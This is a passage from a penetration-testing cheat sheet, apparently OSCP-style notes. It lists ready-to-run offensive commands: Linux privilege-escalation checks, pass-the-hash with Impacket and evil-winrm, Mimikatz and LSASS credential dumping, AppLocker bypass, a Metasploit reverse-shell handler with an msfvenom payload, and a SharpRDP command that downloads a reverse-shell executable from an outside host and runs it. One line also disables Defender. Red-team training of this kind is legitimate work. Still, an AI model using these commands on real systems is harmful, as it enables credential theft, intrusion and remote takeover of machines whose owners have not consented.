  `200 Type set to I.`  
  `ftp> put accesschk.exe` 
  `[ ... ]` 
  `150 Opening BINARY mode data connection for accesschk.exe.`  
  `226 Transfer complete.`  
  
## PrivEsc Linux
- First look for obvious fails, like: 
  - writable etc/passwd or exports 
  - readable etc/shadow. ssh keys, bash history, cronjobs
  - capabilities --> `/sbin/getcap -r / 2>/dev/null`   
  - suid binaries --> `find / -perm -u=s -type f 2>/dev/null`  
    PrivEsc using suid: https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/  
  - editable/vulnerable service binaries  
- Good tools to aid are linpeas.sh, linux-exploit-suggester.sh, LinEnum, LinuxPrivChecker, PowerUp and pspy  

- ltrace: shows parameters of invoked functions and system calls.  
  example: `# ltrace -s 1000 ./filearchiver`  
  `__libc_start_main(0x80483f0, 1, 0xbfdf8a84, 0x8048440 <unfinished ...>`  
  `puts("Archiving files to server..."Archiving files to server...`  
  `)                                      = 36`  
  `system("scp -r file/tobearchived/* 100.101.110.100:/var/www/html/files/"`  
  --> this provides us with the information, that this tool runs "scp" without path!

- Spawn bash shell with python:  
  `python -c 'import pty;pty.spawn("/bin/bash")'`  
  (if python3 --> python3 -c "import pty; pty.spawn('/bin/bash')"`  
  `python -c 'import pty; pty.spawn("/bin/sh")'`  
  
  make the reverse shell more usable (with autocomplete etc.):  
  `ctrl + z`  
  `stty raw -echo; fg`  

## TCPDUMP 
- capture traffic from specific port:  
  `tcpdump -s 0 port ftp or ssh -i eth0 -w mycap.pcap`  
  `tcpdump -s 0 port 3389 -i eth0 -w mycap.pcap`  
  Listen for NetBIOS, SMB, RPC:   
  `tcpdump -i eth0 'port 137 || 138 || 139 || 445'`   
  Record traffic into file and show in console at the same time:   
  `sudo tcpdump -i eth0 -U -w - | tee test.pcap | tcpdump -r -`    

## Searching stuff
- search folder and subfolders for a string, output results and save results to file:   
  `grep -ria @emaildomain.com /mnt/leaks_unpacked/ | tee /root/Desktop/85390/search_emaildomain.out` 
- search for string 'pass' in txt files with error redirection:   
  `find /home -iname "*.txt" 2>/dev/null -exec grep -i 'pass' {} \;`   
- search for string in file and show n number of lines before and after the occurence of the string:   
  `cat <file> | grep "stringtosearch" -C 5`   
- searching the home directories on linux:  
  `ls -ahlR /home `  
- search for ip addresses in files of specified directory and subdirs:   
  `# grep -rnioE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /etc`   
- get full path to file  
  `realpath key.pem`  
- Comparison: get all entries of file2 with are not already in file1:  
  `awk 'FNR==NR{a[$0]=1;next}!($0 in a)' file1 file2`  
- get all unique entries from multiple files and save them to new file:  
  `awk '!a[$0]++' folderwithfiles/* > uniqueentries.txt`  
- find all files with specific ending (recursive) and copy them to a target directory:  
  `find ./ -name "*.burp" -ls -exec cp {} /mnt/hgfs/transfer/targetfolder/ \;`  
  `./` --> means from the current directory and subfolders  
  `-exec` --> with the results from the find command (being {} ), execute the following command  
- Get specific lines of nmap report, e.g. systems with specific port open:  
  `cat TCP-SYN-scan_11-06-19_02-45-50.txt | grep -E "Nmap scan report for|445/tcp open"`  
  `cat nmap_SYN_scan_TCP_TOP_100.nmap | grep -E "Nmap scan report|open" | grep -B1 open`  
- If number of spaces between port and status is different: (Note: there is a space between the brackets!)  
  `cat TCP-SYN-scan_11-06-19_04-59-05.txt | grep -E "80/tcp[ ]+open"`  
- Get last two regex occurences of string, e.g. to return only "domain.topleveldomain" from a long list which includes subdomains:  
  `grep -E "[A-Za-z0-9\-]+\.[A-Za-z0-9\-]+$" --color -o urls.txt | sort -u`  
- another method:  
  `cat domains.txt | rev | cut -d. -f 1-2 | rev`  
- get client IPs from apache access.log and group them:  
  `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`  
- Get Current user:   
  `grep -oz "USER=.*" /proc/self/environ; echo `   
- Get current users id:   
  `cat /proc/self/loginuid;echo`   

## Creating lists
- add domain name to the beginning of each user in a users.txt file:  
  `# sed -e 's/^/THINC\\/' /root/Desktop/OSCP/usernames.txt > /root/Desktop/OSCP/domainusers.txt`  

## Pass-the-Hash techniques
- Dump creds with Impacket:  
  `secretsdump.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
- open cmd.exe on remote target with known hash:  
  `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202 cmd.exe`  
  If psexec is not possible because of AntiVirus, try atexec (and e.g. disable defender):   
  `atexec.py -hashes :e481ed3ed667f5df3c3c3b0dc37ca25f9 winattacklab.local/ffast@10.0.1.100 "powershell -c Set-MpPreference -DisableRealtimeMonitoring \$true"`   
- Open remote connection with known hash using wmiexec:  
  `wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
- connect to target with evil-winrm:   
  `evil-winrm -i <IP> -u <username> -H <ntlm hash>`   
- CME PTH:   
  `cme smb 172.16.1.1 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f`   
  Overpass the hash with CME (using kerberos auth):   
  `cme smb 172.16.1.1 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f -k`   

## Mimikatz
- First Mimikatz commands: (run always)  
  `mimikatz # privilege::debug`  
  `mimikatz # log sekurlsa.log`  
- logonpasswords:  
  `mimikatz # sekurlsa::logonpasswords`  
- other way:  
  `mimikatz # token::elevate`  
  `mimikatz # lsadump::secrets`  
- Use minidump file:  
  `mimikatz # sekurlsa::minidump C:\WINDOWS\Temp\debug7962.bin`  
- PW Dump oneliner: `mimikatz.exe privilege::debug sekurlsa::logonPasswords exit > output.txt`
- Start shell with NTLM hash of user:  
  `mimikatz # sekurlsa::pth /user:admin-kiwi /domain:comp-internal /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd`  
  
## Extracting Credentials   
- Possible attack sequence with metasploit:  
  1. Run Metasploit's "hashdump" to get hashes: `hashdump`  
  2. Start a process under the desired identity: `mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"`  
  3. In Metasploit, abuse the security token of the just spawn process: `steal_token 1234`  
  4. Do now whatever you want in metasploit with these privileges (e.g. list\\target\c$, upload and run binaries, perform WMIC commands, ...)
- Create minidump: (easiest with right click in taskmgr)  
  `procdump64.exe -accepteula -ma lsass.exe lsass.dmp`  
   Remote: `psexec.py -c procdump64.exe 'example.com/username:P@ssw0rd@foobar.example.com' '-accepteula -ma lsass.exe c:\lsass.dmp'`  
- On Kali, you can use pypykatz to extract the creds from the lsass.dmp:  
  Install pypykatz:  
  `# pip3 install pypykatz`  
  Extract the creds from the lsass.dmp:   
  `# pypykatz lsa minidump lsass.dmp`  
- Using registry (security,sam and system)   
  `C:\> reg.exe save hklm\sam c:\temp\sam.save`   
  `C:\> reg.exe save hklm\security c:\temp\security.save`   
  `C:\> reg.exe save hklm\system c:\temp\system.save`   
  `# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`   
- Using PowerShell:   
  `Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] c:\temp\candies.bin full`   
- Extract specific users creds from DC:   
  `impacket-secretsdump 'domain.local/username:password'@<DC-IP> -just-dc-user <username> -just-dc-ntlm`   
- Extract creds from vmdk/vhd/vhdx files: https://github.com/CCob/Volumiser   
- SCCM share (SCCMContentLib$) enumeration and credential extraction: https://github.com/1njected/CMLoot    

### Python NTLM hash
```python
import hashlib,binascii
hash = hashlib.new('md4', "Somepass1".encode('utf-16le')).digest()
password = "Somepass1"
print ("Password before hash: ",password)
print ("Hashed password: ",binascii.hexlify(hash))
```


## Bypass Applocker
- Bypass Applocker with mimilib.dll to run arbitrary executables:  
  `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
- Run PowerShell.exe via wmic.exe:   
  `wmic.exe process call create "cmd /c powershell"`   
- Spawn process using WMI via PowerShell:   
  `([WMICLASS]"\\localhost\ROOT\CIMV2:win32_process").Create("calc.exe")`   
- Load a binary into byte array and run it from powershell:   
  `[byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe`   
  `$asm = [System.Reflection.Assembly]::Load($bytes)`   
  `$vars = New-Object System.Collections.Generic.List[System.Object]`   
  `$vars.Add("-s")`   
  `$vars.Add("-o")`   
  `$vars.Add("snaffler.log")`   
  `$passed = [string[]]$vars.ToArray()`   
  `$asm.EntryPoint.Invoke($null, @(,$passed))`   


## Metasploit
- Multihandler:
  `msf>use exploit multi/handler`  
  `msf>set payload windows/meterpreter/reverse_tcp`  
  `msf>set lhost <local IP>`  
  `msf>set lport <local port>`  
  `msf>set ExitOnSession false`  
  `msf>exploit -j`  
- MSF Payload:  
  `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.90 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows`  
- Vuln Scanning with MSF:  
  make sure db runs: `db_status`  
  `db_nmap -v -sV 10.11.1.35`  
  `db_nmap -sS -Pn -A 10.11.1.35`  
## RDP
### Linux RDP Client
- `rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10`  

### Tunneling via RDP
On Linux:   
1. git clone https://github.com/V-E-O/rdp2tcp
2. apt install mingw-w64
3. make server-mingw32   
Note: You might have to change the <rdp2tcpFolder>/server/Makefile.mingw32 --> Set CC=i686-w64-mingw32-gcc-win32   
4. make client
5. xfreerdp /u:<user> /p:<pw> /v:<TargetIP> /rdp2tcp:/home/kali/rdp2tcp/client/rdp2tcp
6. Transfer the ./server/rdp2tcp.exe to the windows target
7. On the Windows target, run rdp2tcp.exe as an unprivileged user
8. On Linux: configure the proxychains config ("socks5 127.0.0.1 1080" >> /etc/proxychains.conf)
9. `python2 tools/rdp2tcp.py add socks5 127.0.0.1 1080`   
10. enjoy the tunnel with "proxychains .... targets"!

### RDP PTH
PTH over RDP is possible with restricted admin mode enabled:   
```
mimikatz.exe
privilege::debug
sekurlsa::pth /user:admin /domain:lab.local /ntlm:3462D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
To enable restricted admin mode, perform PS remoting, then enable the mode:   
`New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0`   
Note: DisableRestrictAdmin set to 0 enables it!   

Then RDP (via sockproxy if necessary):   
`proxychains4 xfreerdp /u:admin /pth:3462D26CDF84D7A70E2EB3B9F05C425E /v:192.168.1.4 /cert-ignore`   

To run commands over RDP, without mstsc (command line only) run SharpRDP (CASE-SENSITIVE PAYLOAD):   
`sharprdp.exe computername=targetsrv01 username=corp\victim password=lab command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.55.75/reverseshell-processhellosvchost.exe', 'C:\Windows\Tasks\rsshll.exe'); C:\Windows\Tasks\rsshll.exe"`   

## start webserver
- `python -m SimpleHTTPServer 80`  
- `python3 -m http.server 7331`  
- `php -S 0.0.0.0:8000`  
- `ruby -run -e httpd . -p 9000`  
- `busybox httpd -f -p 10000`  
- `updog` (Allows also file upload!)   

## start FTP server
- Install pyftpdlib  
  `pip install pyftpdlib`  
  Run (-w flag allows anonymous write access)  
  `python -m pyftpdlib -p 21 -w`   

## Compiling
- Compiling a C program:  
  `gcc -static -mpreferred-stack-boundary=2 -o Shell ShellSpawn.c`  
  `gcc -o Shell ShellSpawn.c`


## Buffer Overflows etc.
### Patterns
- Create a unique pattern of 2700 byte:  
  `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`  
- locate a hex offset pattern:  
  `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438 -l 2700`
  

## AMSI Stuff
AMSI Test string:   
`‘AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386’ `   

## ServiceNow
- MDSec blog post: https://www.mdsec.co.uk/2025/03/red-teaming-with-servicenow    

## Misc
Create NT hash (RC4) of string using rubeus.exe:   
`rubeus hash /password:<string>`   
Using smbencrypt:   
```bash
# smbencrypt SecureP4ss                
LM Hash                         NT Hash
--------------------------------        --------------------------------
E41905232DC0574622EC7988C7A60073        409EE7AA969E30D8A04F05D6AB78E57C
```
Using python:   
```python
import hashlib,binascii
hash = hashlib.new('md4', "SecureP4ss".encode('utf-16le')).digest()
print(binascii.hexlify(hash))
# Output: b'409ee7aa969e30d8a04f05d6ab78e57c'
```

Search Jira for Credentials: https://github.com/sahadnk72/jecretz   

# Password Cracking 
## HIBP 
The ultimate hibp downloader: https://github.com/HaveIBeenPwned/PwnedPasswordsDownloader/issues/79    
